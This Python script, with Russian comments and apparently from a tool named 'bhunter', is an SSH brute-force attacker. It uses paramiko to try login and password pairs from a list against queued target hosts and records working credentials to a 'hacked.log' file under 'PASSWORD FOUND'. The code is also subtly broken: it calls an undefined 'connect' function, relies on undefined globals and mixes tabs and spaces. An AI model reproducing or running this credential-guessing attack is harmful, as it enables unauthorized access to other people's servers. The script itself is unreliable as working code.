#!/usr/bin/env python3
from threading import Thread
import os, paramiko
import sys
import time
# import libtmux
import datetime, time
import socket, sys, threading
import queue


logs = "/var/log/bhunter/"
attackLog = logs + "attack.log"
hacked = logs + "hacked.log"


#   SSHCheck проверяет, подходит ли логин:пароль к данному хосту
#   Возвращаемые значения:
#       0 - успешная аутентификация
#       1 - неуспешная футентификация
#       2 - ошибка подключения
#       3 - какая либо другая ошибка при подключении по SSH
def SSHCheck(target, sshport, user, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    resultCode = 0
    try:
        ssh.connect(target, port = sshport, username = user, password = password, timeout=5, banner_timeout = 5, auth_timeout=5)
    except paramiko.AuthenticationException:
        resultCode = 1
    except paramiko.ssh_exception.SSHException:
        resultCode = 1
    except socket.error:
        resultCode = 2

    ssh.close()
    return resultCode

def SSHAttack(target, sshport):
	while True:
        # if(queOfTargets.empty)
		target = queOfTargets.get()
		logger(attackLog, "starting attack   {}".format(target))
		for i in listOfLogins:
			logger(attackLog, "try   {} {} {}".format(target, i[1][0], i[1][1]))
			status = connect(target, 22, i[1][0], i[1][1])
			if(status == 2):
				logger(attackLog, "socket error   {}".format(target))
				break
			if(status == 0):
				logger(attackLog, "PASSWORD FOUND   {} {} {}".format(target, i[1][0], i[1][1]))
				logger(hacked, "{} {} {}".format(target, i[1][0], i[1][1]))
				i[0] += 1
		logger(attackLog, "complete   {}".format(target))
	return
